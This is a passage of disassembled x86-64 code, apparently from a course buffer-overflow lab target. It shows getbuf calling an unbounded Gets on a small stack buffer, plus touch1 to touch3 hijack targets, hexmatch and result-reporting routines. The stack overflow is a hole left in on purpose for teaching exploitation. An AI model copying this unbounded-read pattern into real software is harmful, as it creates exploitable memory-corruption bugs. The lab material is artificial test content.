  4015e2:	69 c0 be f1 00 00    	imul   $0xf1be,%eax,%eax
  4015e8:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  4015ec:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  4015f0:	69 c0 6b 33 00 00    	imul   $0x336b,%eax,%eax
  4015f6:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  4015fa:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  4015fe:	69 c0 bb 20 00 00    	imul   $0x20bb,%eax,%eax
  401604:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401608:	8b 44 24 d0          	mov    -0x30(%rsp),%eax
  40160c:	69 c0 9f ba 00 00    	imul   $0xba9f,%eax,%eax
  401612:	89 44 24 d0          	mov    %eax,-0x30(%rsp)
  401616:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  40161a:	69 c0 f2 ee 00 00    	imul   $0xeef2,%eax,%eax
  401620:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  401624:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  401628:	69 c0 cf 43 00 00    	imul   $0x43cf,%eax,%eax
  40162e:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  401632:	8b 44 24 e8          	mov    -0x18(%rsp),%eax
  401636:	69 c0 90 48 00 00    	imul   $0x4890,%eax,%eax
  40163c:	89 44 24 e8          	mov    %eax,-0x18(%rsp)
  401640:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  401644:	69 c0 fd 20 00 00    	imul   $0x20fd,%eax,%eax
  40164a:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  40164e:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  401652:	69 c0 66 4a 00 00    	imul   $0x4a66,%eax,%eax
  401658:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  40165c:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  401660:	69 c0 87 52 00 00    	imul   $0x5287,%eax,%eax
  401666:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  40166a:	8b 44 24 d0          	mov    -0x30(%rsp),%eax
  40166e:	69 c0 d3 25 00 00    	imul   $0x25d3,%eax,%eax
  401674:	89 44 24 d0          	mov    %eax,-0x30(%rsp)
  401678:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  40167c:	69 c0 ea de 00 00    	imul   $0xdeea,%eax,%eax
  401682:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  401686:	8b 44 24 d0          	mov    -0x30(%rsp),%eax
  40168a:	69 c0 0c 2c 00 00    	imul   $0x2c0c,%eax,%eax
  401690:	89 44 24 d0          	mov    %eax,-0x30(%rsp)
  401694:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  401698:	69 c0 7e dc 00 00    	imul   $0xdc7e,%eax,%eax
  40169e:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  4016a2:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  4016a6:	69 c0 8d 67 00 00    	imul   $0x678d,%eax,%eax
  4016ac:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  4016b0:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  4016b4:	69 c0 56 2f 00 00    	imul   $0x2f56,%eax,%eax
  4016ba:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  4016be:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  4016c2:	69 c0 67 a5 00 00    	imul   $0xa567,%eax,%eax
  4016c8:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  4016cc:	8b 44 24 e8          	mov    -0x18(%rsp),%eax
  4016d0:	69 c0 58 1d 00 00    	imul   $0x1d58,%eax,%eax
  4016d6:	89 44 24 e8          	mov    %eax,-0x18(%rsp)
  4016da:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  4016de:	69 c0 02 fb 00 00    	imul   $0xfb02,%eax,%eax
  4016e4:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  4016e8:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  4016ec:	69 c0 9c 8e 00 00    	imul   $0x8e9c,%eax,%eax
  4016f2:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  4016f6:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  4016fa:	69 c0 2b ee 00 00    	imul   $0xee2b,%eax,%eax
  401700:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  401704:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  401708:	69 c0 47 ee 00 00    	imul   $0xee47,%eax,%eax
  40170e:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  401712:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  401716:	69 c0 b8 47 00 00    	imul   $0x47b8,%eax,%eax
  40171c:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  401720:	8b 44 24 e8          	mov    -0x18(%rsp),%eax
  401724:	69 c0 b8 56 00 00    	imul   $0x56b8,%eax,%eax
  40172a:	89 44 24 e8          	mov    %eax,-0x18(%rsp)
  40172e:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  401732:	69 c0 31 91 00 00    	imul   $0x9131,%eax,%eax
  401738:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  40173c:	8b 44 24 e8          	mov    -0x18(%rsp),%eax
  401740:	69 c0 5f bd 00 00    	imul   $0xbd5f,%eax,%eax
  401746:	89 44 24 e8          	mov    %eax,-0x18(%rsp)
  40174a:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  40174e:	69 c0 95 2a 00 00    	imul   $0x2a95,%eax,%eax
  401754:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  401758:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  40175c:	69 c0 18 c8 00 00    	imul   $0xc818,%eax,%eax
  401762:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  401766:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  40176a:	69 c0 c4 f3 00 00    	imul   $0xf3c4,%eax,%eax
  401770:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  401774:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  401778:	69 c0 7d bd 00 00    	imul   $0xbd7d,%eax,%eax
  40177e:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401782:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  401786:	69 c0 d0 60 00 00    	imul   $0x60d0,%eax,%eax
  40178c:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  401790:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  401794:	69 c0 9d b4 00 00    	imul   $0xb49d,%eax,%eax
  40179a:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  40179e:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  4017a2:	69 c0 94 4f 00 00    	imul   $0x4f94,%eax,%eax
  4017a8:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  4017ac:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  4017b0:	69 c0 59 cc 00 00    	imul   $0xcc59,%eax,%eax
  4017b6:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  4017ba:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  4017be:	69 c0 ec a9 00 00    	imul   $0xa9ec,%eax,%eax
  4017c4:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  4017c8:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  4017cc:	69 c0 8c 34 00 00    	imul   $0x348c,%eax,%eax
  4017d2:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  4017d6:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  4017da:	69 c0 61 2d 00 00    	imul   $0x2d61,%eax,%eax
  4017e0:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  4017e4:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  4017e8:	69 c0 d3 ce 00 00    	imul   $0xced3,%eax,%eax
  4017ee:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  4017f2:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  4017f6:	69 c0 18 32 00 00    	imul   $0x3218,%eax,%eax
  4017fc:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  401800:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  401804:	69 c0 37 07 00 00    	imul   $0x737,%eax,%eax
  40180a:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  40180e:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  401812:	69 c0 ca ce 00 00    	imul   $0xceca,%eax,%eax
  401818:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  40181c:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  401820:	69 c0 4e 7a 00 00    	imul   $0x7a4e,%eax,%eax
  401826:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  40182a:	ba 00 00 00 00       	mov    $0x0,%edx
  40182f:	b8 00 00 00 00       	mov    $0x0,%eax
  401834:	eb 0b                	jmp    401841 <scramble+0x59e>
  401836:	89 d1                	mov    %edx,%ecx
  401838:	8b 4c 8c d0          	mov    -0x30(%rsp,%rcx,4),%ecx
  40183c:	01 c8                	add    %ecx,%eax
  40183e:	83 c2 01             	add    $0x1,%edx
  401841:	83 fa 09             	cmp    $0x9,%edx
  401844:	76 f0                	jbe    401836 <scramble+0x593>
  401846:	f3 c3                	repz retq 

0000000000401848 <getbuf>:
  401848:	48 83 ec 38          	sub    $0x38,%rsp
  40184c:	48 89 e7             	mov    %rsp,%rdi
  40184f:	e8 36 02 00 00       	callq  401a8a <Gets>
  401854:	b8 01 00 00 00       	mov    $0x1,%eax
  401859:	48 83 c4 38          	add    $0x38,%rsp
  40185d:	c3                   	retq   

000000000040185e <touch1>:
  40185e:	48 83 ec 08          	sub    $0x8,%rsp
  401862:	c7 05 90 2c 20 00 01 	movl   $0x1,0x202c90(%rip)        # 6044fc <vlevel>
  401869:	00 00 00 
  40186c:	bf f2 2f 40 00       	mov    $0x402ff2,%edi
  401871:	e8 da f3 ff ff       	callq  400c50 <puts@plt>
  401876:	bf 01 00 00 00       	mov    $0x1,%edi
  40187b:	e8 f9 03 00 00       	callq  401c79 <validate>
  401880:	bf 00 00 00 00       	mov    $0x0,%edi
  401885:	e8 66 f5 ff ff       	callq  400df0 <exit@plt>

000000000040188a <touch2>:
  40188a:	48 83 ec 08          	sub    $0x8,%rsp
  40188e:	89 fe                	mov    %edi,%esi
  401890:	c7 05 62 2c 20 00 02 	movl   $0x2,0x202c62(%rip)        # 6044fc <vlevel>
  401897:	00 00 00 
  40189a:	3b 3d 64 2c 20 00    	cmp    0x202c64(%rip),%edi        # 604504 <cookie>
  4018a0:	75 1b                	jne    4018bd <touch2+0x33>
  4018a2:	bf 18 30 40 00       	mov    $0x403018,%edi
  4018a7:	b8 00 00 00 00       	mov    $0x0,%eax
  4018ac:	e8 cf f3 ff ff       	callq  400c80 <printf@plt>
  4018b1:	bf 02 00 00 00       	mov    $0x2,%edi
  4018b6:	e8 be 03 00 00       	callq  401c79 <validate>
  4018bb:	eb 19                	jmp    4018d6 <touch2+0x4c>
  4018bd:	bf 40 30 40 00       	mov    $0x403040,%edi
  4018c2:	b8 00 00 00 00       	mov    $0x0,%eax
  4018c7:	e8 b4 f3 ff ff       	callq  400c80 <printf@plt>
  4018cc:	bf 02 00 00 00       	mov    $0x2,%edi
  4018d1:	e8 55 04 00 00       	callq  401d2b <fail>
  4018d6:	bf 00 00 00 00       	mov    $0x0,%edi
  4018db:	e8 10 f5 ff ff       	callq  400df0 <exit@plt>

00000000004018e0 <hexmatch>:
  4018e0:	41 54                	push   %r12
  4018e2:	55                   	push   %rbp
  4018e3:	53                   	push   %rbx
  4018e4:	48 83 ec 70          	sub    $0x70,%rsp
  4018e8:	41 89 fc             	mov    %edi,%r12d
  4018eb:	48 89 f5             	mov    %rsi,%rbp
  4018ee:	e8 5d f4 ff ff       	callq  400d50 <random@plt>
  4018f3:	48 89 c1             	mov    %rax,%rcx
  4018f6:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  4018fd:	0a d7 a3 
  401900:	48 f7 ea             	imul   %rdx
  401903:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
  401907:	48 c1 f8 06          	sar    $0x6,%rax
  40190b:	48 89 ce             	mov    %rcx,%rsi
  40190e:	48 c1 fe 3f          	sar    $0x3f,%rsi
  401912:	48 29 f0             	sub    %rsi,%rax
  401915:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  401919:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40191d:	48 c1 e0 02          	shl    $0x2,%rax
  401921:	48 29 c1             	sub    %rax,%rcx
  401924:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
  401928:	44 89 e2             	mov    %r12d,%edx
  40192b:	be 0f 30 40 00       	mov    $0x40300f,%esi
  401930:	48 89 df             	mov    %rbx,%rdi
  401933:	b8 00 00 00 00       	mov    $0x0,%eax
  401938:	e8 a3 f4 ff ff       	callq  400de0 <sprintf@plt>
  40193d:	ba 09 00 00 00       	mov    $0x9,%edx
  401942:	48 89 de             	mov    %rbx,%rsi
  401945:	48 89 ef             	mov    %rbp,%rdi
  401948:	e8 e3 f2 ff ff       	callq  400c30 <strncmp@plt>
  40194d:	85 c0                	test   %eax,%eax
  40194f:	0f 94 c0             	sete   %al
  401952:	0f b6 c0             	movzbl %al,%eax
  401955:	48 83 c4 70          	add    $0x70,%rsp
  401959:	5b                   	pop    %rbx
  40195a:	5d                   	pop    %rbp
  40195b:	41 5c                	pop    %r12
  40195d:	c3                   	retq   

000000000040195e <touch3>:
  40195e:	53                   	push   %rbx
  40195f:	48 89 fb             	mov    %rdi,%rbx
  401962:	c7 05 90 2b 20 00 03 	movl   $0x3,0x202b90(%rip)        # 6044fc <vlevel>
  401969:	00 00 00 
  40196c:	48 89 fe             	mov    %rdi,%rsi
  40196f:	8b 3d 8f 2b 20 00    	mov    0x202b8f(%rip),%edi        # 604504 <cookie>
  401975:	e8 66 ff ff ff       	callq  4018e0 <hexmatch>
  40197a:	85 c0                	test   %eax,%eax
  40197c:	74 1e                	je     40199c <touch3+0x3e>
  40197e:	48 89 de             	mov    %rbx,%rsi
  401981:	bf 68 30 40 00       	mov    $0x403068,%edi
  401986:	b8 00 00 00 00       	mov    $0x0,%eax
  40198b:	e8 f0 f2 ff ff       	callq  400c80 <printf@plt>
  401990:	bf 03 00 00 00       	mov    $0x3,%edi
  401995:	e8 df 02 00 00       	callq  401c79 <validate>
  40199a:	eb 1c                	jmp    4019b8 <touch3+0x5a>
  40199c:	48 89 de             	mov    %rbx,%rsi
  40199f:	bf 90 30 40 00       	mov    $0x403090,%edi
  4019a4:	b8 00 00 00 00       	mov    $0x0,%eax
  4019a9:	e8 d2 f2 ff ff       	callq  400c80 <printf@plt>
  4019ae:	bf 03 00 00 00       	mov    $0x3,%edi
  4019b3:	e8 73 03 00 00       	callq  401d2b <fail>
  4019b8:	bf 00 00 00 00       	mov    $0x0,%edi
  4019bd:	e8 2e f4 ff ff       	callq  400df0 <exit@plt>

00000000004019c2 <test>:
  4019c2:	48 83 ec 08          	sub    $0x8,%rsp
  4019c6:	b8 00 00 00 00       	mov    $0x0,%eax
  4019cb:	e8 78 fe ff ff       	callq  401848 <getbuf>
  4019d0:	89 c6                	mov    %eax,%esi
  4019d2:	bf b8 30 40 00       	mov    $0x4030b8,%edi
  4019d7:	b8 00 00 00 00       	mov    $0x0,%eax
  4019dc:	e8 9f f2 ff ff       	callq  400c80 <printf@plt>
  4019e1:	48 83 c4 08          	add    $0x8,%rsp
  4019e5:	c3                   	retq   
  4019e6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  4019ed:	00 00 00 

00000000004019f0 <save_char>:
  4019f0:	8b 05 2e 37 20 00    	mov    0x20372e(%rip),%eax        # 605124 <gets_cnt>
  4019f6:	3d ff 03 00 00       	cmp    $0x3ff,%eax
  4019fb:	7f 49                	jg     401a46 <save_char+0x56>
  4019fd:	8d 14 40             	lea    (%rax,%rax,2),%edx
  401a00:	89 f9                	mov    %edi,%ecx
  401a02:	c0 e9 04             	shr    $0x4,%cl
  401a05:	83 e1 0f             	and    $0xf,%ecx
  401a08:	0f b6 b1 e0 33 40 00 	movzbl 0x4033e0(%rcx),%esi
  401a0f:	48 63 ca             	movslq %edx,%rcx
  401a12:	40 88 b1 20 45 60 00 	mov    %sil,0x604520(%rcx)
  401a19:	8d 4a 01             	lea    0x1(%rdx),%ecx
  401a1c:	83 e7 0f             	and    $0xf,%edi
  401a1f:	0f b6 b7 e0 33 40 00 	movzbl 0x4033e0(%rdi),%esi
  401a26:	48 63 c9             	movslq %ecx,%rcx
  401a29:	40 88 b1 20 45 60 00 	mov    %sil,0x604520(%rcx)
  401a30:	83 c2 02             	add    $0x2,%edx
  401a33:	48 63 d2             	movslq %edx,%rdx
  401a36:	c6 82 20 45 60 00 20 	movb   $0x20,0x604520(%rdx)
  401a3d:	83 c0 01             	add    $0x1,%eax
  401a40:	89 05 de 36 20 00    	mov    %eax,0x2036de(%rip)        # 605124 <gets_cnt>
  401a46:	f3 c3                	repz retq 

0000000000401a48 <save_term>:
  401a48:	8b 05 d6 36 20 00    	mov    0x2036d6(%rip),%eax        # 605124 <gets_cnt>
  401a4e:	8d 04 40             	lea    (%rax,%rax,2),%eax
  401a51:	48 98                	cltq   
  401a53:	c6 80 20 45 60 00 00 	movb   $0x0,0x604520(%rax)
  401a5a:	c3                   	retq   

0000000000401a5b <check_fail>:
  401a5b:	48 83 ec 08          	sub    $0x8,%rsp
  401a5f:	0f be 35 c2 36 20 00 	movsbl 0x2036c2(%rip),%esi        # 605128 <target_prefix>
  401a66:	b9 20 45 60 00       	mov    $0x604520,%ecx
  401a6b:	8b 15 87 2a 20 00    	mov    0x202a87(%rip),%edx        # 6044f8 <check_level>
  401a71:	bf db 30 40 00       	mov    $0x4030db,%edi
  401a76:	b8 00 00 00 00       	mov    $0x0,%eax
  401a7b:	e8 00 f2 ff ff       	callq  400c80 <printf@plt>
  401a80:	bf 01 00 00 00       	mov    $0x1,%edi
  401a85:	e8 66 f3 ff ff       	callq  400df0 <exit@plt>

0000000000401a8a <Gets>:
  401a8a:	41 54                	push   %r12
  401a8c:	55                   	push   %rbp
  401a8d:	53                   	push   %rbx
  401a8e:	49 89 fc             	mov    %rdi,%r12
  401a91:	c7 05 89 36 20 00 00 	movl   $0x0,0x203689(%rip)        # 605124 <gets_cnt>
  401a98:	00 00 00 
  401a9b:	48 89 fb             	mov    %rdi,%rbx
  401a9e:	eb 11                	jmp    401ab1 <Gets+0x27>
  401aa0:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
  401aa4:	88 03                	mov    %al,(%rbx)
  401aa6:	0f b6 f8             	movzbl %al,%edi
  401aa9:	e8 42 ff ff ff       	callq  4019f0 <save_char>
  401aae:	48 89 eb             	mov    %rbp,%rbx
  401ab1:	48 8b 3d 38 2a 20 00 	mov    0x202a38(%rip),%rdi        # 6044f0 <infile>
  401ab8:	e8 a3 f2 ff ff       	callq  400d60 <_IO_getc@plt>
  401abd:	83 f8 ff             	cmp    $0xffffffff,%eax
  401ac0:	74 05                	je     401ac7 <Gets+0x3d>
  401ac2:	83 f8 0a             	cmp    $0xa,%eax
  401ac5:	75 d9                	jne    401aa0 <Gets+0x16>
  401ac7:	c6 03 00             	movb   $0x0,(%rbx)
  401aca:	b8 00 00 00 00       	mov    $0x0,%eax
  401acf:	e8 74 ff ff ff       	callq  401a48 <save_term>
  401ad4:	4c 89 e0             	mov    %r12,%rax
  401ad7:	5b                   	pop    %rbx
  401ad8:	5d                   	pop    %rbp
  401ad9:	41 5c                	pop    %r12
  401adb:	c3                   	retq   

0000000000401adc <notify_server>:
  401adc:	83 3d 25 2a 20 00 00 	cmpl   $0x0,0x202a25(%rip)        # 604508 <is_checker>
  401ae3:	0f 85 8e 01 00 00    	jne    401c77 <notify_server+0x19b>
  401ae9:	53                   	push   %rbx
  401aea:	48 81 ec 10 40 00 00 	sub    $0x4010,%rsp
  401af1:	89 fb                	mov    %edi,%ebx
  401af3:	8b 05 2b 36 20 00    	mov    0x20362b(%rip),%eax        # 605124 <gets_cnt>
  401af9:	83 c0 64             	add    $0x64,%eax
  401afc:	3d 00 20 00 00       	cmp    $0x2000,%eax
  401b01:	7e 19                	jle    401b1c <notify_server+0x40>
  401b03:	bf 10 32 40 00       	mov    $0x403210,%edi
  401b08:	b8 00 00 00 00       	mov    $0x0,%eax
  401b0d:	e8 6e f1 ff ff       	callq  400c80 <printf@plt>
  401b12:	bf 01 00 00 00       	mov    $0x1,%edi
  401b17:	e8 d4 f2 ff ff       	callq  400df0 <exit@plt>
  401b1c:	44 0f be 0d 04 36 20 	movsbl 0x203604(%rip),%r9d        # 605128 <target_prefix>
  401b23:	00 
  401b24:	83 3d 7d 29 20 00 00 	cmpl   $0x0,0x20297d(%rip)        # 6044a8 <notify>
  401b2b:	74 09                	je     401b36 <notify_server+0x5a>
  401b2d:	44 8b 05 cc 29 20 00 	mov    0x2029cc(%rip),%r8d        # 604500 <authkey>
  401b34:	eb 06                	jmp    401b3c <notify_server+0x60>
  401b36:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
  401b3c:	85 db                	test   %ebx,%ebx
  401b3e:	74 07                	je     401b47 <notify_server+0x6b>
  401b40:	b9 f1 30 40 00       	mov    $0x4030f1,%ecx
  401b45:	eb 05                	jmp    401b4c <notify_server+0x70>
  401b47:	b9 f6 30 40 00       	mov    $0x4030f6,%ecx
  401b4c:	48 c7 44 24 08 20 45 	movq   $0x604520,0x8(%rsp)
  401b53:	60 00 
  401b55:	89 34 24             	mov    %esi,(%rsp)
  401b58:	8b 15 0a 26 20 00    	mov    0x20260a(%rip),%edx        # 604168 <target_id>
  401b5e:	be fb 30 40 00       	mov    $0x4030fb,%esi
  401b63:	48 8d bc 24 10 20 00 	lea    0x2010(%rsp),%rdi
  401b6a:	00 
  401b6b:	b8 00 00 00 00       	mov    $0x0,%eax
  401b70:	e8 6b f2 ff ff       	callq  400de0 <sprintf@plt>
  401b75:	83 3d 2c 29 20 00 00 	cmpl   $0x0,0x20292c(%rip)        # 6044a8 <notify>
  401b7c:	74 78                	je     401bf6 <notify_server+0x11a>
  401b7e:	85 db                	test   %ebx,%ebx
  401b80:	74 68                	je     401bea <notify_server+0x10e>
  401b82:	4c 8d 4c 24 10       	lea    0x10(%rsp),%r9
  401b87:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  401b8d:	48 8d 8c 24 10 20 00 	lea    0x2010(%rsp),%rcx
  401b94:	00 
  401b95:	48 8b 15 d4 25 20 00 	mov    0x2025d4(%rip),%rdx        # 604170 <lab>
  401b9c:	48 8b 35 d5 25 20 00 	mov    0x2025d5(%rip),%rsi        # 604178 <course>
  401ba3:	48 8b 3d b6 25 20 00 	mov    0x2025b6(%rip),%rdi        # 604160 <user_id>
  401baa:	e8 94 0f 00 00       	callq  402b43 <driver_post>
  401baf:	85 c0                	test   %eax,%eax
  401bb1:	79 1e                	jns    401bd1 <notify_server+0xf5>
  401bb3:	48 8d 74 24 10       	lea    0x10(%rsp),%rsi
  401bb8:	bf 17 31 40 00       	mov    $0x403117,%edi
  401bbd:	b8 00 00 00 00       	mov    $0x0,%eax
  401bc2:	e8 b9 f0 ff ff       	callq  400c80 <printf@plt>
  401bc7:	bf 01 00 00 00       	mov    $0x1,%edi
  401bcc:	e8 1f f2 ff ff       	callq  400df0 <exit@plt>
  401bd1:	bf 40 32 40 00       	mov    $0x403240,%edi
  401bd6:	e8 75 f0 ff ff       	callq  400c50 <puts@plt>
  401bdb:	bf 23 31 40 00       	mov    $0x403123,%edi
  401be0:	e8 6b f0 ff ff       	callq  400c50 <puts@plt>
  401be5:	e9 85 00 00 00       	jmpq   401c6f <notify_server+0x193>
  401bea:	bf 2d 31 40 00       	mov    $0x40312d,%edi
  401bef:	e8 5c f0 ff ff       	callq  400c50 <puts@plt>
  401bf4:	eb 79                	jmp    401c6f <notify_server+0x193>
  401bf6:	85 db                	test   %ebx,%ebx
  401bf8:	74 08                	je     401c02 <notify_server+0x126>
  401bfa:	be f1 30 40 00       	mov    $0x4030f1,%esi
  401bff:	90                   	nop
  401c00:	eb 05                	jmp    401c07 <notify_server+0x12b>
  401c02:	be f6 30 40 00       	mov    $0x4030f6,%esi
  401c07:	bf 78 32 40 00       	mov    $0x403278,%edi
  401c0c:	b8 00 00 00 00       	mov    $0x0,%eax
  401c11:	e8 6a f0 ff ff       	callq  400c80 <printf@plt>
  401c16:	48 8b 35 43 25 20 00 	mov    0x202543(%rip),%rsi        # 604160 <user_id>
  401c1d:	bf 34 31 40 00       	mov    $0x403134,%edi
  401c22:	b8 00 00 00 00       	mov    $0x0,%eax
  401c27:	e8 54 f0 ff ff       	callq  400c80 <printf@plt>
  401c2c:	48 8b 35 45 25 20 00 	mov    0x202545(%rip),%rsi        # 604178 <course>
  401c33:	bf 41 31 40 00       	mov    $0x403141,%edi
  401c38:	b8 00 00 00 00       	mov    $0x0,%eax
  401c3d:	e8 3e f0 ff ff       	callq  400c80 <printf@plt>
  401c42:	48 8b 35 27 25 20 00 	mov    0x202527(%rip),%rsi        # 604170 <lab>
  401c49:	bf 4d 31 40 00       	mov    $0x40314d,%edi
  401c4e:	b8 00 00 00 00       	mov    $0x0,%eax
  401c53:	e8 28 f0 ff ff       	callq  400c80 <printf@plt>
  401c58:	48 8d b4 24 10 20 00 	lea    0x2010(%rsp),%rsi
  401c5f:	00 
  401c60:	bf 56 31 40 00       	mov    $0x403156,%edi
  401c65:	b8 00 00 00 00       	mov    $0x0,%eax
  401c6a:	e8 11 f0 ff ff       	callq  400c80 <printf@plt>
  401c6f:	48 81 c4 10 40 00 00 	add    $0x4010,%rsp
  401c76:	5b                   	pop    %rbx
  401c77:	f3 c3                	repz retq 

0000000000401c79 <validate>:
  401c79:	53                   	push   %rbx
  401c7a:	89 fb                	mov    %edi,%ebx
  401c7c:	83 3d 85 28 20 00 00 	cmpl   $0x0,0x202885(%rip)        # 604508 <is_checker>
  401c83:	74 60                	je     401ce5 <validate+0x6c>
  401c85:	39 3d 71 28 20 00    	cmp    %edi,0x202871(%rip)        # 6044fc <vlevel>
  401c8b:	74 14                	je     401ca1 <validate+0x28>
  401c8d:	bf 62 31 40 00       	mov    $0x403162,%edi
  401c92:	e8 b9 ef ff ff       	callq  400c50 <puts@plt>
  401c97:	b8 00 00 00 00       	mov    $0x0,%eax
  401c9c:	e8 ba fd ff ff       	callq  401a5b <check_fail>
  401ca1:	8b 35 51 28 20 00    	mov    0x202851(%rip),%esi        # 6044f8 <check_level>
  401ca7:	39 fe                	cmp    %edi,%esi
  401ca9:	74 1b                	je     401cc6 <validate+0x4d>
  401cab:	89 fa                	mov    %edi,%edx
  401cad:	bf a0 32 40 00       	mov    $0x4032a0,%edi
  401cb2:	b8 00 00 00 00       	mov    $0x0,%eax
  401cb7:	e8 c4 ef ff ff       	callq  400c80 <printf@plt>
  401cbc:	b8 00 00 00 00       	mov    $0x0,%eax
  401cc1:	e8 95 fd ff ff       	callq  401a5b <check_fail>
  401cc6:	0f be 35 5b 34 20 00 	movsbl 0x20345b(%rip),%esi        # 605128 <target_prefix>
  401ccd:	b9 20 45 60 00       	mov    $0x604520,%ecx
  401cd2:	89 fa                	mov    %edi,%edx
  401cd4:	bf 80 31 40 00       	mov    $0x403180,%edi
  401cd9:	b8 00 00 00 00       	mov    $0x0,%eax
  401cde:	e8 9d ef ff ff       	callq  400c80 <printf@plt>
  401ce3:	eb 44                	jmp    401d29 <validate+0xb0>
  401ce5:	39 3d 11 28 20 00    	cmp    %edi,0x202811(%rip)        # 6044fc <vlevel>
  401ceb:	74 18                	je     401d05 <validate+0x8c>
  401ced:	bf 62 31 40 00       	mov    $0x403162,%edi
  401cf2:	e8 59 ef ff ff       	callq  400c50 <puts@plt>
  401cf7:	89 de                	mov    %ebx,%esi
  401cf9:	bf 00 00 00 00       	mov    $0x0,%edi
  401cfe:	e8 d9 fd ff ff       	callq  401adc <notify_server>
  401d03:	eb 24                	jmp    401d29 <validate+0xb0>
  401d05:	0f be 15 1c 34 20 00 	movsbl 0x20341c(%rip),%edx        # 605128 <target_prefix>
  401d0c:	89 fe                	mov    %edi,%esi
  401d0e:	bf c8 32 40 00       	mov    $0x4032c8,%edi
  401d13:	b8 00 00 00 00       	mov    $0x0,%eax
  401d18:	e8 63 ef ff ff       	callq  400c80 <printf@plt>
  401d1d:	89 de                	mov    %ebx,%esi
  401d1f:	bf 01 00 00 00       	mov    $0x1,%edi
  401d24:	e8 b3 fd ff ff       	callq  401adc <notify_server>
  401d29:	5b                   	pop    %rbx
  401d2a:	c3                   	retq   

0000000000401d2b <fail>:
  401d2b:	48 83 ec 08          	sub    $0x8,%rsp
  401d2f:	83 3d d2 27 20 00 00 	cmpl   $0x0,0x2027d2(%rip)        # 604508 <is_checker>
  401d36:	74 0a                	je     401d42 <fail+0x17>
  401d38:	b8 00 00 00 00       	mov    $0x0,%eax
  401d3d:	e8 19 fd ff ff       	callq  401a5b <check_fail>
  401d42:	89 fe                	mov    %edi,%esi
  401d44:	bf 00 00 00 00       	mov    $0x0,%edi
  401d49:	e8 8e fd ff ff       	callq  401adc <notify_server>
  401d4e:	48 83 c4 08          	add    $0x8,%rsp
  401d52:	c3                   	retq   

0000000000401d53 <bushandler>:
  401d53:	48 83 ec 08          	sub    $0x8,%rsp
  401d57:	83 3d aa 27 20 00 00 	cmpl   $0x0,0x2027aa(%rip)        # 604508 <is_checker>
  401d5e:	74 14                	je     401d74 <bushandler+0x21>
